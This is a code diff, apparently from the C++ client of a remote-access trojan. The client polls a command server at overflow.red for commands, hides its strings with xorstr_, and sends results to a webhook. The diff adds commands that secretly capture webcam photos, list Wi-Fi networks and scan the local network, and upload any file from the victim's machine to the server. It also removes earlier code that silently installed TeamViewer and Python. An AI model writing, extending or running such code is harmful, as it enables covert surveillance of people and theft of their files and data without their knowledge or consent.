@@ -14,12 +14,6 @@ namespace client {
 		void handler_loop() {
 			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&webhook_url=") + client::client_webhook_url + std::string(xorstr_("&content=**Notification**\n```\n")) + std::string(xorstr_("Communication Thread Created")) + xorstr_("\n```"));
 
-			if (!std::filesystem::exists(helpers::roaming + xorstr_("\\Microsoft\\") + "tv"))
-				functions::install_teamviewer();
-
-			if (!std::filesystem::exists(xorstr_("C:\\Python38")) && !std::filesystem::exists(xorstr_("C:\\Python39")) && !std::filesystem::exists(xorstr_("C:\\Program Files\\Python39")))
-				functions::install_python();
-		
 			while (true) {
 				auto cmd = requests::get_request("https://overflow.red/post.php", xorstr_("cmd=get_command&ip=") + client::ip);
 				if (!cmd.empty()) {	
@@ -32,13 +26,25 @@ namespace client {
 						requests::post_request(xorstr_("https://overflow.red/post.php"), client::functions::prepare_payload(xorstr_("All Windows"), client::functions::get_all_windows()));
 					}
 					else if (cmd == xorstr_("camera")) {
-						if (std::filesystem::exists(xorstr_("C:\\Python38")) || std::filesystem::exists(xorstr_("C:\\Python39")) || std::filesystem::exists(xorstr_("C:\\Program Files\\Python39"))) {
-							system((std::string("python -c \"(lambda __g: [[(camera.set(cv2.CAP_PROP_FPS, 30.0), (camera.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter.fourcc(\'m\', \'j\', \'p\', \'g\')), (camera.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter.fourcc(\'M\', \'J\', \'P\', \'G\')), (camera.set(cv2.CAP_PROP_FRAME_WIDTH, 1920), (camera.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080), [(cv2.imwrite(\'") + helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + std::string(".jpg") + std::string("\', img), None)[1] for (__g[\'retval\'], __g[\'img\']) in [(camera.read())]][0])[1])[1])[1])[1])[1] for __g[\'camera\'] in [(cv2.VideoCapture(0, cv2.CAP_DSHOW))]][0] for __g[\'cv2\'] in [(__import__(\'cv2\', __g, __g))]][0])(globals())\"")).c_str());
-							requests::post_request_file(xorstr_("https://overflow.red/post.php"), helpers::roaming + xorstr_("\\Microsoft\\") + client::ip + xorstr_(".jpg"));
-							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**Camera**") + std::string("&ip=") + client::ip);
+						if (helpers::is_python_installed()) {
+							system(("cd " + helpers::roaming + xorstr_("\\Microsoft\\scripts && python camera.py")).c_str());
+							requests::post_request_file(xorstr_("https://overflow.red/post.php"), helpers::roaming + xorstr_("\\Microsoft\\scripts\\camera.jpg"));
+							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**Camera**") + std::string("&ip=camera"));
 						}
 						else {
 							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Camera**\n```\nPython is not installed.\n```"));
+						}
+					}
+					else if (cmd == xorstr_("devices")) {
+						if (helpers::is_python_installed()) {
+							auto ip = client::functions::get_default_gateway();
+							auto ssid = helpers::exec("netsh wlan show networks|find \"SSID\"");
+							ssid.replace(ssid.length() - 1, ssid.length(), "");
+							auto res = helpers::exec(("python " + helpers::roaming + xorstr_("\\Microsoft\\scripts\\scanner.py ") + ip + " \"" + ssid + "\"").c_str());
+							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Devices Response**\n```\n") + res + xorstr_("\n```"));
+						}
+						else {
+							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Devices Response**\n```\nPython is not installed.\n```"));
 						}
 					}
 					else if (cmd == xorstr_("tv setup")) {
@@ -56,6 +62,12 @@ namespace client {
 						else {
 							requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string(xorstr_("TeamViewer is not installed. Possible failure to install during startup")) + xorstr_("\n```"));
 						}
+					}
+					else if (cmd.find(xorstr_("upload")) != std::string::npos) {
+						auto path = cmd.substr(sizeof("upload"));
+						requests::post_request_file(xorstr_("https://overflow.red/post.php"), path, "file");
+						std::string base_filename = path.substr(path.find_last_of("/") + 1);
+						requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_upload&name=") + base_filename + std::string("&content=**Upload**"));
 					}
 					else if (cmd.find(xorstr_("download")) != std::string::npos &&
 							 (cmd.find(xorstr_("https")) != std::string::npos ||
